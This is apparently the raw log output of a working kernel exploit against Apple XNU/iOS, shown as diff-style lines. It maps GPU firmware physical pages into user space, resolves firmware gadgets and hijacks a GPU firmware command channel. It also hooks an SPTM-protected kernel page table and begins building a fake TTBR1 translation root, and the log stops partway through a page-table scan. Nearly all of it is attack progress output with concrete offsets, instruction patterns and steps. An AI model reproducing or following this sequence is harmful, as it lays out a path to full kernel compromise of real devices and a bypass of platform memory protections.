+[bringup] pte_scan_for_physaddr(firmware_pa=0x80063c000)...
+[pscan] scan begin: target PA=0x80063c000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
+[pscan] L2 PAGE hit: PA 0x80063c000 -> KVA 0xffffffe0c876c000 (l0=6 l1=100 l2=475, 96732 checks)
+[bringup] firmware_pa 0x80063c000 -> KVA 0xffffffe0c876c000 -> v4[31]
+[bringup] === OK ===
+[bringup] === AGX FIRMWARE MAGIC WALK ===
+[bringup] mapping firmware PA 0x80063c000...
+[port] port=0x8687 -> ipc_port=0xffffffed2b201270
+[ppl] mapped PA=0x80063c000 -> user 0x1074ec000 (kobj=0xffffffed2c3c4a00)
+[bringup] firmware mapped at user VA 0x1074ec000
+[bringup] magic found at qword idx 266 (offset 0x850) of mapped page
+[bringup] *(v48-5)  v50    = 0xffffff800005c000 (vaddr)
+[bringup] *(v48-4)         = 0xffffff80000f1ba0 (vend)
+[bringup] *v48     post    = 0xffffff800000423c
+[bringup] v48[7]           = 0xffffff80000594a8
+[bringup] v51 = vend-vaddr = 0x95ba0 (size)
+[bringup] kptr_mask v41    = 0xffffff8000000000
+[bringup] v50 - v41        = 0x5c000 (KVA-relative)
+[bringup] === OK ===
+[agx] -> running firmware bring-up firmware clone...
+[bringup] === vm_allocate + vm_remap firmware clone ===
+[bringup] v52 firmware PA   = 0x80063c000
+[bringup] v53 clone size    = 0x5c000 (== firmware_kva_off)
+[bringup] v54 vm_page_size  = 0x4000
+[bringup] vm_allocate -> user VA 0x10d058000 (size 0x5c000)
+[bringup] cloning 23 pages of 0x4000 bytes each
+[port] port=0x7c54b -> ipc_port=0xffffffed2b07c340
+[ppl] mapped PA=0x80063c000 -> user 0x1074ec000 (kobj=0xffffffed2c3c4a00)
+[bringup]   iter 0: PA=0x80063c000 -> src_va=0x1074ec000 -> target=0x10d058000
+[port] port=0x58913 -> ipc_port=0xffffffed2b07ee90
+[port] port=0x7c72f -> ipc_port=0xffffffed2b090610
+[kobj_find] recv_ipc=0xffffffed2b090610 v27=0xffffffed2b090670
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4a40 size=64 (need 64)
+[ppl] mapped PA=0x800640000 -> user 0x107608000 (kobj=0xffffffed2c3c4a40)
+[bringup]   iter 1: PA=0x800640000 -> src_va=0x107608000 -> target=0x10d05c000
+[port] port=0x2d713 -> ipc_port=0xffffffed2b09f040
+[port] port=0x666f -> ipc_port=0xffffffed2b092e00
+[kobj_find] recv_ipc=0xffffffed2b092e00 v27=0xffffffed2b092e60
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4a80 size=64 (need 64)
+[ppl] mapped PA=0x800644000 -> user 0x107f54000 (kobj=0xffffffed2c3c4a80)
+[port] port=0x3d6ab -> ipc_port=0xffffffed2ad24850
+[port] port=0x58e67 -> ipc_port=0xffffffed2b9fc4f0
+[kobj_find] recv_ipc=0xffffffed2b9fc4f0 v27=0xffffffed2b9fc550
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4ac0 size=64 (need 64)
+[ppl] mapped PA=0x800648000 -> user 0x107fec000 (kobj=0xffffffed2c3c4ac0)
+[port] port=0x57d2f -> ipc_port=0xffffffed2ab57dc0
+[port] port=0x2e53 -> ipc_port=0xffffffed2b0071f0
+[kobj_find] recv_ipc=0xffffffed2b0071f0 v27=0xffffffed2b007250
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4b00 size=64 (need 64)
+[ppl] mapped PA=0x80064c000 -> user 0x107ff8000 (kobj=0xffffffed2c3c4b00)
+[port] port=0x58547 -> ipc_port=0xffffffed2b0921a0
+[port] port=0x7d14b -> ipc_port=0xffffffed2aa238b0
+[kobj_find] recv_ipc=0xffffffed2aa238b0 v27=0xffffffed2aa23910
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4680 size=64 (need 64)
+[ppl] mapped PA=0x800650000 -> user 0x109c6c000 (kobj=0xffffffed2c3c4680)
+[port] port=0x58a53 -> ipc_port=0xffffffed2b116590
+[port] port=0x7b56f -> ipc_port=0xffffffed2a96a2c0
+[kobj_find] recv_ipc=0xffffffed2a96a2c0 v27=0xffffffed2a96a320
+[kobj_find] SUCCESS: addr=0xffffffed2c3c46c0 size=64 (need 64)
+[ppl] mapped PA=0x800654000 -> user 0x102fe8000 (kobj=0xffffffed2c3c46c0)
+[port] port=0x7da2f -> ipc_port=0xffffffed2a9d2f20
+[port] port=0x58853 -> ipc_port=0xffffffed2b007a60
+[kobj_find] recv_ipc=0xffffffed2b007a60 v27=0xffffffed2b007ac0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4b40 size=64 (need 64)
+[ppl] mapped PA=0x800658000 -> user 0x109264000 (kobj=0xffffffed2c3c4b40)
+[port] port=0x80673 -> ipc_port=0xffffffed2aa58cd0
+[port] port=0x5753 -> ipc_port=0xffffffed2b0931f0
+[kobj_find] recv_ipc=0xffffffed2b0931f0 v27=0xffffffed2b093250
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4700 size=64 (need 64)
+[ppl] mapped PA=0x80065c000 -> user 0x109b4c000 (kobj=0xffffffed2c3c4700)
+[port] port=0x897b -> ipc_port=0xffffffed2b093550
+[port] port=0x395f -> ipc_port=0xffffffed2b07f550
+[kobj_find] recv_ipc=0xffffffed2b07f550 v27=0xffffffed2b07f5b0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4b80 size=64 (need 64)
+[ppl] mapped PA=0x800660000 -> user 0x109b50000 (kobj=0xffffffed2c3c4b80)
+[port] port=0x9c87 -> ipc_port=0xffffffed2ab355d0
+[port] port=0x57227 -> ipc_port=0xffffffed2b07df60
+[kobj_find] recv_ipc=0xffffffed2b07df60 v27=0xffffffed2b07dfc0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4bc0 size=64 (need 64)
+[ppl] mapped PA=0x800664000 -> user 0x109268000 (kobj=0xffffffed2c3c4bc0)
+[port] port=0x7b967 -> ipc_port=0xffffffed2b11f040
+[port] port=0xa05f -> ipc_port=0xffffffed2b09d4b0
+[kobj_find] recv_ipc=0xffffffed2b09d4b0 v27=0xffffffed2b09d510
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4c00 size=64 (need 64)
+[ppl] mapped PA=0x800668000 -> user 0x109b48000 (kobj=0xffffffed2c3c4c00)
+[port] port=0x7d22f -> ipc_port=0xffffffed2a971390
+[port] port=0x7c33b -> ipc_port=0xffffffed2a9a8cd0
+[kobj_find] recv_ipc=0xffffffed2a9a8cd0 v27=0xffffffed2a9a8d30
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4c40 size=64 (need 64)
+[ppl] mapped PA=0x80066c000 -> user 0x109b9c000 (kobj=0xffffffed2c3c4c40)
+[port] port=0x3d24b -> ipc_port=0xffffffed2b1d5930
+[port] port=0x57f2f -> ipc_port=0xffffffed2b07c730
+[kobj_find] recv_ipc=0xffffffed2b07c730 v27=0xffffffed2b07c790
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4740 size=64 (need 64)
+[ppl] mapped PA=0x800670000 -> user 0x10a3e8000 (kobj=0xffffffed2c3c4740)
+[port] port=0x7e72f -> ipc_port=0xffffffed2b092110
+[port] port=0x9a5f -> ipc_port=0xffffffed2b09f0d0
+[kobj_find] recv_ipc=0xffffffed2b09f0d0 v27=0xffffffed2b09f130
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4780 size=64 (need 64)
+[ppl] mapped PA=0x800674000 -> user 0x10926c000 (kobj=0xffffffed2c3c4780)
+[port] port=0x7e133 -> ipc_port=0xffffffed2a9e70d0
+[port] port=0x7dc2f -> ipc_port=0xffffffed2b07dae0
+[kobj_find] recv_ipc=0xffffffed2b07dae0 v27=0xffffffed2b07db40
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4c80 size=64 (need 64)
+[ppl] mapped PA=0x800678000 -> user 0x109b88000 (kobj=0xffffffed2c3c4c80)
+[port] port=0x7b84b -> ipc_port=0xffffffed2ab927d0
+[port] port=0x7d533 -> ipc_port=0xffffffed2a9edc00
+[kobj_find] recv_ipc=0xffffffed2a9edc00 v27=0xffffffed2a9edc60
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4cc0 size=64 (need 64)
+[ppl] mapped PA=0x80067c000 -> user 0x109c68000 (kobj=0xffffffed2c3c4cc0)
+[port] port=0x56627 -> ipc_port=0xffffffed2b07d9c0
+[port] port=0x7e927 -> ipc_port=0xffffffed2b07d930
+[kobj_find] recv_ipc=0xffffffed2b07d930 v27=0xffffffed2b07d990
+[kobj_find] SUCCESS: addr=0xffffffed2c3c47c0 size=64 (need 64)
+[ppl] mapped PA=0x800680000 -> user 0x10a3b8000 (kobj=0xffffffed2c3c47c0)
+[port] port=0x7c62b -> ipc_port=0xffffffed2ab30220
+[port] port=0x7de2f -> ipc_port=0xffffffed2b07d810
+[kobj_find] recv_ipc=0xffffffed2b07d810 v27=0xffffffed2b07d870
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4800 size=64 (need 64)
+[ppl] mapped PA=0x800684000 -> user 0x109270000 (kobj=0xffffffed2c3c4800)
+[port] port=0x7e333 -> ipc_port=0xffffffed2b07c2b0
+[port] port=0x57833 -> ipc_port=0xffffffed2b092740
+[kobj_find] recv_ipc=0xffffffed2b092740 v27=0xffffffed2b0927a0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4840 size=64 (need 64)
+[ppl] mapped PA=0x800688000 -> user 0x109274000 (kobj=0xffffffed2c3c4840)
+[port] port=0x57337 -> ipc_port=0xffffffed2bce10c0
+[port] port=0x57b37 -> ipc_port=0xffffffed2b091ff0
+[kobj_find] recv_ipc=0xffffffed2b091ff0 v27=0xffffffed2b092050
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4d00 size=64 (need 64)
+[ppl] mapped PA=0x80068c000 -> user 0x109c54000 (kobj=0xffffffed2c3c4d00)
+[port] port=0x9e97 -> ipc_port=0xffffffed2b07cbb0
+[port] port=0x56f2f -> ipc_port=0xffffffed2b07cc40
+[kobj_find] recv_ipc=0xffffffed2b07cc40 v27=0xffffffed2b07cca0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4880 size=64 (need 64)
+[ppl] mapped PA=0x800690000 -> user 0x109c64000 (kobj=0xffffffed2c3c4880)
+[port] port=0x7f32f -> ipc_port=0xffffffed2ab3c2b0
+[port] port=0x7bd0f -> ipc_port=0xffffffed2b07ed70
+[kobj_find] recv_ipc=0xffffffed2b07ed70 v27=0xffffffed2b07edd0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4d40 size=64 (need 64)
+[ppl] mapped PA=0x800694000 -> user 0x109aec000 (kobj=0xffffffed2c3c4d40)
+[bringup]   iter 22: PA=0x800694000 -> src_va=0x109aec000 -> target=0x10d0b0000
+[bringup] clone[0x850] = 0x7777777777777700 (expected 0x7777777777777700)
+[bringup] === OK ===
+[agx] firmware clone OK -- clone VA=0x10d058000 size=0x5c000 pages=23
+[agx] -> running resolve...
+[resolve] === read 2 firmware pointers from clone, pte_scan ===
+[resolve] off_post  = 0x423c  (firmware_post_qw  KVA 0xffffff800000423c)
+[resolve] off_v48_7 = 0x594a8  (firmware_v48_7    KVA 0xffffff80000594a8)
+[resolve] p66=0x10d05c23c p67=0x10d0b14a8 clone_base=0x10d058000 clone_size=0x5c000
+[resolve] page_post=1 (in-page off 0x23c) page_v48_7=22 (in-page off 0x14a8)
+[resolve] pre-touch p66[0] (page 1)...
+[resolve] pre-touch p66[0] = 0x00 OK
+[resolve] reading 8 bytes from p66 (page 1)...
+[resolve] v64 = 0x801ce4000
+[resolve] pre-touch p67[0] (page 22)...
+[resolve] pre-touch p67[0] = 0x00 OK
+[resolve] reading 8 bytes from p67 (page 22)...
+[resolve] v61 = 0x8ffeec000
+[resolve] pte_scan_for_physaddr(v64=0x801ce4000)...
+[pscan] scan begin: target PA=0x801ce4000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
+[pscan] L2 PAGE hit: PA 0x801ce4000 -> KVA 0xffffffe0c87c8000 (l0=6 l1=100 l2=498, 96755 checks)
+[resolve] pte_scan(v64=0x801ce4000) -> KVA 0xffffffe0c87c8000 -> v4[32]
+[resolve] pte_scan_for_physaddr(v61=0x8ffeec000)...
+[pscan] scan begin: target PA=0x8ffeec000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
+[pscan] L2 PAGE hit: PA 0x8ffeec000 -> KVA 0xffffffe0c85a4000 (l0=6 l1=100 l2=361, 96618 checks)
+[resolve] pte_scan(v61=0x8ffeec000) -> KVA 0xffffffe0c85a4000 -> v4[74]
+[resolve] === OK ===
+[agx] -> running resolve...
+[resolve] === clone pattern scan + ADRP+LDR resolve ===
+[resolve] match at clone+0x27618 (firmware VA 0xffffff8000027618)
+[resolve] insn[2]=0xd0000653 (ADRP) insn[3]=0xf9037e60 (LDR/ADD)
+[resolve] adrp_pc=0xffffff8000027620 adrp_off=0xca000 ldr_off=0x6f8 (shift=3)
+[resolve] resolved target firmware VA = 0xffffff80000f16f8
+[resolve] *target = 0xffffff80000ea3e0
+[resolve] v4[43] = 0xffffff80000ea428 (= *target + 72)
+[resolve] === OK ===
+[agx] -> running resolve...
+[resolve] === clone scans for v4[44]/v4[45]/v4[46] ===
+[resolve] step 3: idx=5397 -> v4[44] = firmware VA 0xffffff8000005454
+[resolve] step 4: pattern at clone+0x73c -> v4[45] = firmware VA 0xffffff800000073c
+[resolve] step 5: idx=5590 -> v4[46] = firmware VA 0xffffff8000005758
+[resolve] === OK ===
+[agx] -> running resolve...
+[resolve] === kernel zero-page scan ===
+[resolve] using L0 table KVA = 0xffffffe0c85a4000 (firmware-provided)
+[fwpt] L1 pte_scan L0[2] PA=0x817478000 ...
+[pscan] scan begin: target PA=0x817478000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
+[pscan] progress: L0[6] L1[233] tables_walked=64 l2_checks=129024
+[pscan] progress: L0[6] L1[1453] tables_walked=96 l2_checks=194560
+[pscan] L0[7] -> L1 table at KVA 0xfffffff048520000
+[pscan] L2 PAGE hit: PA 0x817478000 -> KVA 0xfffffff07aa1c000 (l0=7 l1=61 l2=647, 252552 checks)
+[fwpt] L1 KVA L0[2] = 0xfffffff07aa1c000 (PA 0x817478000)
+[fwpt] L2 pte_scan PA=0x81747c000 ...
+[pscan] scan begin: target PA=0x81747c000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
+[pscan] progress: L0[6] L1[233] tables_walked=64 l2_checks=129024
+[pscan] progress: L0[6] L1[1453] tables_walked=96 l2_checks=194560
+[pscan] L0[7] -> L1 table at KVA 0xfffffff048520000
+[pscan] L2 PAGE hit: PA 0x81747c000 -> KVA 0xfffffff07aa20000 (l0=7 l1=61 l2=648, 252553 checks)
+[fwpt] L2 KVA = 0xfffffff07aa20000 (PA 0x81747c000)
+[port] port=0x7e82b -> ipc_port=0xffffffed2b07f3a0
+[port] port=0x7e65f -> ipc_port=0xffffffed2b43bd30
+[kobj_find] recv_ipc=0xffffffed2b43bd30 v27=0xffffffed2b43bd90
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4d80 size=64 (need 64)
+[ppl] mapped PA=0x817418000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x7e82f -> ipc_port=0xffffffed2b07d420
+[ppl] mapped PA=0x81741c000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x7e833 -> ipc_port=0xffffffed2b07faf0
+[ppl] mapped PA=0x817420000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x7e837 -> ipc_port=0xffffffed2b07f3a0
+[ppl] mapped PA=0x817424000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x7e83b -> ipc_port=0xffffffed2b07f3a0
+[ppl] mapped PA=0x817428000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x7e803 -> ipc_port=0xffffffed2ad756f0
+[ppl] mapped PA=0x81742c000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x7e807 -> ipc_port=0xffffffed2b785d20
+[ppl] mapped PA=0x817430000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x7e80b -> ipc_port=0xffffffed2b785d20
+[ppl] mapped PA=0x8173f4000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x7e80f -> ipc_port=0xffffffed2ad756f0
+[ppl] mapped PA=0x8173f8000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d63 -> ipc_port=0xffffffed2b07f3a0
+[ppl] mapped PA=0x8173fc000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d67 -> ipc_port=0xffffffed2b092980
+[ppl] mapped PA=0x817440000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d6b -> ipc_port=0xffffffed2b092980
+[ppl] mapped PA=0x817444000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d6f -> ipc_port=0xffffffed2be29e40
+[ppl] mapped PA=0x817448000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d73 -> ipc_port=0xffffffed2a9ee230
+[ppl] mapped PA=0x81744c000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d77 -> ipc_port=0xffffffed2b785d20
+[ppl] mapped PA=0x817450000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d7b -> ipc_port=0xffffffed2b07e2c0
+[ppl] mapped PA=0x817454000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d03 -> ipc_port=0xffffffed2b07e2c0
+[ppl] mapped PA=0x817458000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d07 -> ipc_port=0xffffffed2a9ee230
+[ppl] mapped PA=0x81745c000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d0b -> ipc_port=0xffffffed2ad756f0
+[ppl] mapped PA=0x817460000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d0f -> ipc_port=0xffffffed2ad756f0
+[ppl] mapped PA=0x817464000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d13 -> ipc_port=0xffffffed2b028460
+[ppl] mapped PA=0x817468000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d17 -> ipc_port=0xffffffed2b028460
+[ppl] mapped PA=0x81746c000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d1b -> ipc_port=0xffffffed2b07e590
+[ppl] mapped PA=0x817470000 -> user 0x1074fc000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d1f -> ipc_port=0xffffffed2b07d150
+[ppl] mapped PA=0x817434000 -> user 0x109b44000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d23 -> ipc_port=0xffffffed2b07e110
+[ppl] mapped PA=0x817438000 -> user 0x109b44000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d27 -> ipc_port=0xffffffed2b201300
+[ppl] mapped PA=0x81743c000 -> user 0x109af0000 (kobj=0xffffffed2c3c4d80)
+[port] port=0x56d2b -> ipc_port=0xffffffed2ab64610
+[ppl] mapped PA=0x817480000 -> user 0x109af0000 (kobj=0xffffffed2c3c4d80)
+[resolve] scan complete: mapped=27 unmapped=0 zero=19
+[resolve] bitfield: 00 00 00 01 01 01 01 01 01 01 01 01 01 00 00 00 00 00 01 01 01 01 01 01 01 01 01 
+[resolve] decision: forward scan hit at idx 18
+[resolve] === OK -- zero_kva = 0xffffffa000068000 (idx 18) ===
+[agx] -> running resolve...
+[resolve] === clone 5-insn pattern + LDR-literal kread ===
+[resolve] match @ clone+0x43730 -> firmware VA 0xffffff8000043730
+[resolve] LDR insn=0x5812e1a0 imm19=0x970d byte_off=154676 -> literal VA 0xffffff8000069368
+[resolve] v4[51] = firmware VA 0xffffff8000043730, v4[52] = pointer 0xffffff8000069250
+[resolve] === OK ===
+[agx] -> running resolve...
+[resolve] === DSB SY/ISB/RET + B(0) clone scans ===
+[resolve] DSB/ISB/RET @ clone+0x704 -> v4[53] = firmware VA 0xffffff8000000704
+[resolve] B(0) @ clone+0x8c -> v4[54] = firmware VA 0xffffff800000008c
+[resolve] === OK ===
+[agx] -> running resolve...
+[resolve] === finalize + writable page handles ===
+[resolve] v4[47]=0xffffffa000000000 v4[49]=0xffffff9100160000 v4[50]=0xffffff9100170000
+[resolve] vm_deallocate clone @ 0x10d058000 size 0x5c000
+[resolve] pte_prepare_writable_page zero_kva=0xffffffa000068000 ...
+[port] port=0x7f333 -> ipc_port=0xffffffed2a9d2f20
+[ppl] mapped PA=0x817460000 -> user 0x102fe8000 (kobj=0xffffffed2c3c4d80)
+[resolve] zero_kva 0xffffffa000068000 -> PA 0x817460000 -> user VA 0x102fe8000
+[resolve] pte_prepare_writable_page v47_base=0xffffffa000000000 ...
+[port] port=0x9e9b -> ipc_port=0xffffffed2b116590
+[port] port=0x27d3 -> ipc_port=0xffffffed2b0921a0
+[kobj_find] recv_ipc=0xffffffed2b0921a0 v27=0xffffffed2b092200
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4dc0 size=64 (need 64)
+[ppl] mapped PA=0x89fb30000 -> user 0x1074ec000 (kobj=0xffffffed2c3c4dc0)
+[resolve] v47_base 0xffffffa000000000 -> PA 0x89fb30000 -> user VA 0x1074ec000
+[resolve] === OK ===
+[own] mode=FULL (post-resolve)
+[own] === own-channel serve === continuous keepalive running (submits=4854)
+[own] our_task=0xffffffe9978adbb0 ipc_space=0xffffffea7bd797b0 ipc_table=0xffffffe057f68000 entries=2730 A1VT=0xfffffff068e172d0 (sel7=0x1)
+[port] port=0x58c63 -> ipc_port=0xffffffed2bce1e40
+[own] want_vt(our leaf UC class)=0xfffffff068e17618
+[own]  port[78] kobj=0xffffffea7b4797f8 dev=0xffffffeb63fe43a0 leaf_vt=0xfffffff0691534f8 cont=0x0(BAD)
+[own]  port[1420] kobj=0xffffffea7b484de8 dev=0xffffffeb5c2880c0 leaf_vt=0xfffffff068e17618(==want) cont=0xffffffea7cdd5e00
+[own]   dev+0x110..130: +110=0xffffffeb5b3e2d70 +118=0x0 +120=0xffffffea7cdd5e00 +128=0x0 +130=0x0 | cont+0x80..A8: +80=0xffffffe9970c7280 +88=0xffffffe9970c8a40 +90=0xffffffe9970c8a80 +98=0x0 +a0=0x0 +a8=0x0
+[own] cont=0xffffffea7cdd5e00 LT+0x80 array=0xffffffec45ebe000 cnt=1024 nonnull-A1VT=0 -> 0 wq-bearing (leaf_vt == want)
+[own]    LT+0x88 arr[1] cq=0xffffffeb6264b000 wqcount(+0x88C)=0 pool=0x0/0x0/0x0
+[own] cont=0xffffffea7cdd5e00 LT+0x88 array=0xffffffec45cac000 cnt=1024 nonnull-A1VT=1 -> 0 wq-bearing (leaf_vt == want)
+[own] cont=0xffffffea7cdd5e00 LT+0x90 array=0xffffffec45cae000 cnt=1024 nonnull-A1VT=1 -> 0 wq-bearing (leaf_vt == want)
+[own]  port[1972] kobj=0xffffffea7b479718 dev=0xffffffeb5c287de0 leaf_vt=0xfffffff068e17618(==want) cont=0xffffffea7cdd6c00
+[own]   dev+0x110..130: +110=0xffffffeb5b3e2270 +118=0x0 +120=0xffffffea7cdd6c00 +128=0x10 +130=0x0 | cont+0x80..A8: +80=0xffffffe9970c1640 +88=0xffffffe9970c1480 +90=0xffffffe9970c14c0 +98=0x0 +a0=0x0 +a8=0x0
+[own] cont=0xffffffea7cdd6c00 LT+0x80 array=0xffffffec45caa000 cnt=1024 nonnull-A1VT=1 -> 0 wq-bearing (leaf_vt == want)
+[own]    LT+0x88 arr[1] cq=0xffffffeb62645000 wqcount(+0x88C)=0 pool=0xffffffea7ba159c0/0x0/0x0
+[own] cont=0xffffffea7cdd6c00 LT+0x88 array=0xffffffec45e04000 cnt=1024 nonnull-A1VT=1 -> 5 wq-bearing (leaf_vt == want)
+[own] cont=0xffffffea7cdd6c00 LT+0x90 array=0xffffffec45ec6000 cnt=1024 nonnull-A1VT=1 -> 0 wq-bearing (leaf_vt == want)
+[own] IPC walk: active-IKOT0x1D=3 kobj_ok=3 dev_ok=3 cont_ok=2 uniq_conts=2 -> 5 candidate channels
+[own] cand[0] regid=1 cq=0xffffffeb62645000 ch=0xffffffec495c8460(wq+0x1e8) +0x78 0x2a1->0xba ADVANCED
+[own] cand[1] regid=1 cq=0xffffffeb62645000 ch=0xffffffed2b8883a0(wq+0x1f0) +0x78 0x34->0x29e ADVANCED
+[own] cand[2] regid=1 cq=0xffffffeb62645000 ch=0xffffffec495c8460(wq+0x1e8) +0x78 0x2a2->0x190 ADVANCED
+[own] cand[3] regid=1 cq=0xffffffeb62645000 ch=0xffffffed2b8883a0(wq+0x1f0) +0x78 0x36->0x396 ADVANCED
+[own] cand[4] regid=1 cq=0xffffffeb62645000 ch=0xffffffed2b8883a0(wq+0x858) +0x78 0x36->0x3ec ADVANCED
+[own] picked queue (advanced under continuous keepalive): regid=1 cq=0xffffffeb62645000 ch=0xffffffec495c8460 (wq+0x1e8)
+[deliver] live channel resolved: ptr_ring=0xffffffdd1ca86860 ctrl=0xffffffdd1ca7e860 size=1280 -> op-0f delivery
+[deliver] orig=0xffffff80000ea090 power-thread saved ctx: PC=0xffffff8000045318 SP_EL0=0xffffff80000e9f50 SPSR=0x60000304 CPACR=0x300000
+[deliver]   x0=0x1(==0?0 -> resume_uat-tail x0=0 MISMATCH-check) x1=0x0 x19=0x0 x20=0xffffff8000068000 x29=0xffffff80000e9fa0 x30=0xffffff8000045310
+[port] port=0x7dda3 -> ipc_port=0xffffffed2ab93f70
+[kobj_find] recv_ipc=0xffffffed2ab93f70 v27=0xffffffed2ab93fd0
+[kobj_find] SUCCESS: addr=0xffffffec496e4000 size=16384 (need 16384)
+[verify] real kernel PT page: kva=0xfffffff075a98000 pa=0x8124f4000 safe_slot=0 (off=0x0)
+[verify] witness pte_kva=0xfffffff075a9adc8 pte_val=0x46000084664c603 page_pa=0x84664c000
+[deliver] FULL target = REAL XNU_PAGE_TABLE page (SPTM-protected): pa=0x8124f4000 kva=0xfffffff075a98000 safe_off=0x0
+[port] port=0x585b3 -> ipc_port=0xffffffed2b07ec50
+[kobj_find] recv_ipc=0xffffffed2b07ec50 v27=0xffffffed2b07ecb0
+[kobj_find] SUCCESS: addr=0xffffffec496e8000 size=16384 (need 16384)
+[port] port=0x58107 -> ipc_port=0xffffffed2b9d8460
+[kobj_find] recv_ipc=0xffffffed2b9d8460 v27=0xffffffed2b9d84c0
+[kobj_find] SUCCESS: addr=0xffffffec4965c000 size=16384 (need 16384)
+[deliver] hook_L3 kva=0xffffffec496e8000 pa=0x8518a0000 [0]->benign(kva=0xffffffec4965c000 pa=0x8751e0000) | HOOK: real_L1 pa=0x8097e8000 +0x3ff0 = 0x4600008518a0603 | window_VA=0xffffffeffc000000 rw_attr=0x460000000000603
+[ttbr1] === build fake TTBR1 (clone live root @0x8ffeec000 + self-ref branch) ===
+[pscan] scan begin: target PA=0x8ffeec000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
+[pscan] L2 PAGE hit: PA 0x8ffeec000 -> KVA 0xffffffe0c85a4000 (l0=6 l1=100 l2=361, 96618 checks)
+[ttbr1] read live root via kread (reverse-map kva=0xffffffe0c85a4000) ok=1
+[ttbr1]   L1[0]=0x00000008ffef0403 valid=1 table nextPA=0x8ffef0000
+[ttbr1]   L1[1]=0x00000008ffef8403 valid=1 table nextPA=0x8ffef8000
+[ttbr1]   L1[2]=0x0000000817478003 valid=1 table nextPA=0x817478000
+[ttbr1]   L1[3]=0x0000000000000000 valid=0 block nextPA=0x0
+[ttbr1]   L1[4]=0x0000000000000000 valid=0 block nextPA=0x0
+[ttbr1]   L1[5]=0x0000000000000000 valid=0 block nextPA=0x0
+[ttbr1]   L1[6]=0x0000000000000000 valid=0 block nextPA=0x0
+[ttbr1]   L1[7]=0x0000000000000000 valid=0 block nextPA=0x0
+[ttbr1] first FREE L1 slot = 3 -> self-ref window S = 0xffffffb000000000
+[pscan] scan begin: target PA=0x817478000, TTBR1 KVA=0xfffffff048518000
+[pscan] L0[5] -> L1 table at KVA 0xfffffff06cd88000
+[pscan] progress: L0[5] L1[1567] tables_walked=32 l2_checks=63488
+[pscan] L0[6] -> L1 table at KVA 0xfffffff06cd8c000
